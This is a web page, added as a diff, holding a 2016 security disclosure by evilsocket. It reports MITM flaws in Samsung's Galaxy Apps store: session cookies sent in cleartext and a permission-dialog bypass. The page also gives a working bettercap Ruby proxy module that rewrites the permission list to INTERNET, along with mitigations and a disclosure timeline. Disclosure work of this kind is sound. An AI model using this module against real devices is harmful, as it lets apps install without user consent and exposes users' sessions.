@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Samsung Galaxy Apps MITM Vulnerabilities | evilsocket / Simone</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart watches, is vulnerable to MITM attacks whi">
+<meta name="keywords" content="mitm,man in the middle,session hijacking,permission bypass,samsung,samsung galaxy apps,galaxy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Samsung Galaxy Apps MITM Vulnerabilities">
+<meta property="og:url" content="https://www.evilsocket.net/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/index.html">
+<meta property="og:site_name" content="evilsocket &#x2F; Simone">
+<meta property="og:description" content="The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart watches, is vulnerable to MITM attacks whi">
+<meta property="og:image" content="https://www.evilsocket.net/images/2016/08/galaxyapps.png">
+<meta property="og:image" content="https://www.evilsocket.net/images/2016/08/productDetailOverview.png">
+<meta property="og:image" content="https://www.evilsocket.net/images/2016/08/androidManifestList.png">
+<meta property="og:image" content="https://www.evilsocket.net/images/2016/08/mail.png">
+<meta property="og:updated_time" content="2017-08-11T14:28:47.044Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Samsung Galaxy Apps MITM Vulnerabilities">
+<meta name="twitter:description" content="The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart watches, is vulnerable to MITM attacks whi">
+<meta name="twitter:image" content="https://www.evilsocket.net/images/2016/08/galaxyapps.png">
+<meta name="twitter:creator" content="@evilsocket">
+<link rel="publisher" href="https://plus.google.com/104794390596458308819">
+
+  <meta name="google-site-verification" content="6qdVG0z0lac2ceITCoTCNm15CPp3K9Sq41_5IK4OLKM">
+
+  
+    <link rel="alternate" href="/atom.xml" title="evilsocket / Simone" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/favicon.ico">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-22026549-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+  <script type="text/javascript" src="https://blockchain.info/Resources/js/pay-now-button.js"></script>
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">evilsocket / Simone</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">I hack stuff.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/books.html">Books</a>
+        
+          <a class="main-nav-link" href="/random-facts-about-me.html">About Me</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        <a id="nav-github-link" class="nav-icon" href="https://github.com/evilsocket" target="_blank"></a>
+        <a id="nav-linkedin-link" class="nav-icon" href="http://it.linkedin.com/in/simonemargaritelli/" target="_blank"></a>
+        <a id="nav-twitter-link" class="nav-icon" href="https://twitter.com/evilsocket" target="_blank"></a>
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.evilsocket.net"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Samsung-Galaxy-Apps-MITM-Vulnerabilities" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Samsung Galaxy Apps MITM Vulnerabilities
+    </h1>
+  
+
+      </header>
+    
+    <br/>
+    <div class="article-meta">
+      Posted on <time datetime="2016-08-17T10:01:42.000Z" itemprop="datePublished">2016-08-17</time>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <br/>
+        <div class="addthis_sharing_toolbox"></div>
+        <p>The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart watches, is vulnerable to MITM attacks which could cause user information leaks, permissions dialog bypass and session hijacking.</p>
+<h4 id="Affected-Products"><a href="#Affected-Products" class="headerlink" title="Affected Products"></a>Affected Products</h4><p>Samsung Galaxy Apps &lt;= 4.1.01-14</p>
+<center><br><img src="/images/2016/08/galaxyapps.png" alt="galaxy apps"><br></center>
+
+<a id="more"></a>
+<h2 id="MITM-Information-Leaks-and-Session-Hijacking"><a href="#MITM-Information-Leaks-and-Session-Hijacking" class="headerlink" title="MITM, Information Leaks and Session Hijacking"></a>MITM, Information Leaks and Session Hijacking</h2><h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>Most of the application API requests are made through a unsafe HTTP connection which would allow a malicious third party to perform a network MITM attack and eventually exfiltrate user sensitive data such as his session identifier and subsequently use this data to impersonate the user session.</p>
+<h4 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h4><p>The application relies on a XML based API used through HTTP, as soon as the user will open the app and start browsing a network attacker will be able to see requests sent to the API server and the user session data, for instance the first request being executed when the user clicks on an application detail page, identified by the name <strong>productDetailOverview</strong> is composed as shown in the following picture.</p>
+<center><br><img src="/images/2016/08/productDetailOverview.png" alt="galaxy apps"><br></center>
+
+<p>The XML response will contain application data such as the creation date, last update date, product name and description, etc.</p>
+<p>It is possible to see that the user session cookies ( <strong>UUID</strong> and <strong>JSESSIONID</strong> ) are sent in cleartext, therefore they can be used by an attacker to impersonate the user and perform API requests on his behalf.</p>
+<p>Other XML request names sent during application browsing and installation are:</p>
+<ul>
+<li><strong>bigBannerList</strong>, used to obtain application preview images.</li>
+<li><strong>expertCommentList</strong> and commentList, these fetch comments for an app.</li>
+<li><strong>productDetailRelated</strong>, fetches related applications list.</li>
+<li><strong>categoryProductList2Notc</strong>, fetches products in the same category.</li>
+<li><strong>sellerProductList2Notc</strong>, fetches other products of the same vendor.</li>
+<li><strong>androidManifestList</strong>, fetches the list of permissions required by the application before installing it ( more on this later ).</li>
+</ul>
+<h4 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h4><ul>
+<li>User Impersonation - An attacker could use the exfiltrated session data to authenticate against the API server on the user’s behalf.</li>
+<li>Contents Manipulation - With a transparent proxy and proper redirection rules, an attacker could intercept and modify the XML responses before they’re received by the application, this would allow him to replace product images, names and descriptions with fake ones.</li>
+</ul>
+<h2 id="Permissions-Dialog-Bypass"><a href="#Permissions-Dialog-Bypass" class="headerlink" title="Permissions Dialog Bypass"></a>Permissions Dialog Bypass</h2><h4 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h4><p>It is possible for an attacker performing a MITM network attack to intercept and modify the XML response of the <strong>androidManifestList</strong> request and force the product to install an application without showing to the user the permission list dialog which would require his approval.</p>
+<h4 id="Details-1"><a href="#Details-1" class="headerlink" title="Details"></a>Details</h4><p>Once the user clicks on the “Install” button, an <strong>androidManifestList</strong> request is sent to the API endpoint in order to fetch the list of permissions that the application requires:</p>
+<center><br><img src="/images/2016/08/androidManifestList.png" alt="galaxy apps"><br></center>
+
+<p>As shown in this picture, the response will contain the list of permissions separated by a double pipe ( “||” ) token.</p>
+<p>This list is then splitted by the application and the user is prompted with a dialog which shows him the required permissions, the installation process requires the user to accept all of them in order to successfully continue.</p>
+<center><br><img src="/images/2016/08/mail.png" alt="galaxy apps"><br></center>
+
+<p>An attacker performing a MITM network attack can intercept and modify the XML response for this API before it’s sent to the device and replace the permissions list with a single <strong>INTERNET</strong> permission entry, in this case the Samsung Galaxy Apps store will directly install the application without showing the user any dialog at all.</p>
+<p>The following is a POC bettercap proxy module.</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="comment">=begin</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">BETTERCAP</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">Author : Simone 'evilsocket' Margaritelli</span></div><div class="line"><span class="comment">Email  : evilsocket<span class="doctag">@gmail</span>.com</span></div><div class="line"><span class="comment">Blog   : http://www.evilsocket.net/</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">This project is released under the GPL 3 license.</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">=end</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">GalaxyApps</span> &lt; BetterCap::Proxy::<span class="title">HTTP::Module</span></span></div><div class="line">  meta(</div><div class="line">    <span class="string">'Name'</span>        =&gt; <span class="string">'GalaxyApps'</span>,</div><div class="line">    <span class="string">'Description'</span> =&gt; <span class="string">'Bypass permission dialog for "Galaxy Apps" application on every Samsung device.'</span>,</div><div class="line">    <span class="string">'Version'</span>     =&gt; <span class="string">'1.0.0'</span>,</div><div class="line">    <span class="string">'Author'</span>      =&gt; <span class="string">"Simone 'evilsocket' Margaritelli"</span>,</div><div class="line">    <span class="string">'License'</span>     =&gt; <span class="string">'GPL3'</span></div><div class="line">  )</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">on_request</span><span class="params">( request, response )</span></span></div><div class="line">    <span class="keyword">if</span> !request.body.<span class="literal">nil</span>? <span class="keyword">and</span> request.body.<span class="keyword">include</span>?(<span class="string">'&lt;SamsungProtocol'</span>)</div><div class="line">      req_name = <span class="string">'???'</span></div><div class="line">      <span class="keyword">if</span> request.body =~ <span class="regexp">/.+&lt;request\s+name="([^"]+)"/i</span></div><div class="line">        req_name = $1</div><div class="line">      <span class="keyword">end</span></div><div class="line"></div><div class="line">      BetterCap::Logger.info <span class="string">"[<span class="subst">#&#123;<span class="string">'GALAXY APPS'</span>.green&#125;</span>] Detected Galaxy Apps traffic: <span class="subst">#&#123;<span class="string">'request'</span>.blue&#125;</span>='<span class="subst">#&#123;req_name.yellow&#125;</span>'"</span></div><div class="line"></div><div class="line">      <span class="keyword">if</span> req_name == <span class="string">'androidManifestList'</span></div><div class="line">        response.body.gsub!( <span class="regexp">/permission"&gt;[^&lt;]+&lt;/i</span>, <span class="string">'permission"&gt;INTERNET&lt;'</span> )</div><div class="line">      <span class="keyword">end</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
+<h4 id="Impact-1"><a href="#Impact-1" class="headerlink" title="Impact"></a>Impact</h4><p>An attacker could trick the user to think that an application which requires sensitive permissions does not require any at all, thus forcing the store to install it without any kind of user manual approval.</p>
+<h4 id="Mitigations-amp-Recommendations"><a href="#Mitigations-amp-Recommendations" class="headerlink" title="Mitigations &amp; Recommendations"></a>Mitigations &amp; Recommendations</h4><ul>
+<li>Use HTTPS connections for every API request.</li>
+<li>Implement SSL key pinning to avoid SSL MITM attacks.</li>
+<li>Double check the list of permissions after the application is downloaded reading them directly from its AndroidManifest.xml file.</li>
+</ul>
+<h4 id="Disclosure-Timeline"><a href="#Disclosure-Timeline" class="headerlink" title="Disclosure Timeline"></a>Disclosure Timeline</h4><ul>
+<li>May 2 2016 : Initial disclosure.</li>
+<li>June 7 2016 : Follow up.</li>
+<li>June 8 2016 : Email from vendor working on fixes.</li>
+<li>June 9 2016 : Confirmation that fixes were going to be pushed in next release</li>
+</ul>
+
+      
+      
+      <hr/>
+      <center>
+
+        <div style="font-size:16px;margin:0 auto;width:300px" class="blockchain-btn"
+        data-address="16xFm5NrKV6eEV4TTDEUdkjqe62L352apW"
+        data-shared="false">
+        <div class="blockchain stage-begin">
+        <img src="https://blockchain.info/Resources/buttons/donate_64.png"/>
+        </div>
+        <div class="blockchain stage-loading" style="text-align:center">
+        <img src="https://blockchain.info/Resources/loading-large.gif"/>
+        </div>
+        <div class="blockchain stage-ready">
+        <p align="center">Please Donate To Bitcoin Address: <b>[[address]]</b></p>
+        <p align="center" class="qr-code"></p>
+        </div>
+        <div class="blockchain stage-paid">
+        Donation of <b>[[value]] BTC</b> Received. Thank You.
+        </div>
+        <div class="blockchain stage-error">
+        <font color="red">[[error]]</font>
+        </div>
+        </div>
+
+        <p style="font-size:27px">
+            Let's stay in touch!
+            <br/>
+            <a href="https://twitter.com/evilsocket" class="twitter-follow-button" data-show-count="false" data-size="large">Follow @evilsocket</a> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+        </p>
+      </center>
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="https://www.evilsocket.net/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/galaxy/">galaxy</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/man-in-the-middle/">man in the middle</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mitm/">mitm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/permission-bypass/">permission bypass</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/samsung/">samsung</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/samsung-galaxy-apps/">samsung galaxy apps</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/session-hijacking/">session hijacking</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/08/24/RCE-against-every-open-source-BTS/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          DISCLOSURE - RCE Against Every Open Source BTS Software.
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/07/27/How-The-United-Arab-Emirates-Intelligence-Tried-to-Hire-me-to-Spy-on-its-People/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">How the United Arab Emirates Intelligence Tried to Hire Me to Spy on Its People</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 Simone Margaritelli<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-4da572964da15ce9" async="async"></script>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/books.html" class="mobile-nav-link">Books</a>
+  
+    <a href="/random-facts-about-me.html" class="mobile-nav-link">About Me</a>
+  
+</nav>
+    
+<script>
+  var disqus_shortname = 'evilsocket';
+  
+  var disqus_url = 'https://www.evilsocket.net/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
